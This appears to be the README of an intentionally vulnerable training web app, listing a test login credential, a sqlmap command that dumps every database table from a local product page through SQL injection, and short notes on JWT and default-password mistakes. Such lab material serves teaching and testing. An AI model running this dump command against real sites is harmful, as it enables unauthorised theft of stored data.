# Security Issues

The goal of this application is to show off security issues that have been witnessed in the public space.


membership user: testuser@gmail.com:P@ssw0rd

## SQL Injection
1. SQL Map via: python sqlmap.py -u "http://hamazon.localpc.com/product-detail-page/?sku=00001" --level=5 --risk=2 --dump-all
2. 


## Authentication
1. Dont store sensitive values in JWT Tokens... (Check Here)[https://jwt.io/]
2. Dont use the default password from websites... (Click Here)[https://github.com/jwt-dotnet/jwt]